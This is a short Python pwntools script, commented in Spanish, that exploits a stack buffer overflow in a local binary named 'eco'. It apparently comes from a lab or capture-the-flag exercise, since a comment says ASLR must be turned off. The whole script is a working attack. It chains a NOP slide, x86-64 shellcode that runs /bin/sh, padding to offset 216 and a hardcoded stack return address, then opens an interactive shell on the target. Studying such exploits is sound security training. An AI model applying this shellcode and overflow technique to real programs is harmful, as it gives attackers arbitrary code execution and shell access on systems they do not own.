#!/usr/bin/python3

# No olvidar quitar ASLR

from pwn import *

# Cargamos el binario
eco = process("./eco")

# Hay que encontrar cual funciona
stackp = 0x00007fffffffdba0
shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"


def payload(shellcode, stackp, offset = 216):
    # El shellcode tiene que estar alineado con el stack tras el NOP slide.
    slide = 16 * 8 * b'\x90'
    rest = (offset - 16 * 8 - len(shellcode)) * 'A'
    # [ 0x90 0x90 ...... 0x90 <shellcode> <basura> <rip> ]
    return flat(slide, shellcode, rest, stackp, endianness="little", word_size=64)


def exploit(payload):
    eco.sendline(payload)
    eco.interactive()

res = payload(shellcode, stackp)
exploit(res)
# print(res)
